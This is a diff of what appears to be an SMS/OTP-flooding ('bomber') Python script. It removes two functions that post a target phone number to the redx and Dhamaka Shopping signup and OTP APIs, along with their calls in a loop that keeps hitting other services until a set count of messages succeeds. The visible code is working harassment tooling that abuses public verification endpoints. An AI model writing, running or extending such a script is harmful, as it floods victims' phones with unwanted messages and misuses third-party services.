@@ -126,38 +126,6 @@ def swap(num):
 	failed+=1
 	update()
 
-def redx(num):
-	global total_sent,success,failed
-
-	url = "https://api.redx.com.bd/v1/user/signup"
-	headers = CaseInsensitiveDict()
-	headers["Content-Type"] = "application/json"
-	data = '{"name":"'+num+'","phoneNumber":"'+num+'","service":"redx"}'
-	resp = requests.post(url, headers=headers, data=data)
-	total_sent+=1
-	if json.loads(resp.text).get('error')==False:
-		success+=1
-		update()
-		return
-	failed+=1
-	update()
-
-def dhamaka(num):
-	global total_sent,success,failed
-
-	url = "https://auth.dhamakashopping.com/api/otp"
-	headers = CaseInsensitiveDict()
-	headers["Content-Type"] = "application/json"
-	data = '{"phoneNumber":"+88'+num+'"}'
-	resp = requests.post(url, headers=headers, data=data)
-	total_sent+=1
-	if resp.status_code==200:
-		success+=1
-		update()
-		return
-	failed+=1
-	update()
-
 def shwapno(num):
 	global total_sent,success,failed
 
@@ -298,12 +266,6 @@ while True:
 		if not success<=amount-1:
 			goodbye()
 		swap(number)
-		if not success<=amount-1:
-			goodbye()
-		redx(number)
-		if not success<=amount-1:
-			goodbye()
-		dhamaka(number)
 		if not success<=amount-1:
 			goodbye()
 		shwapno(number)
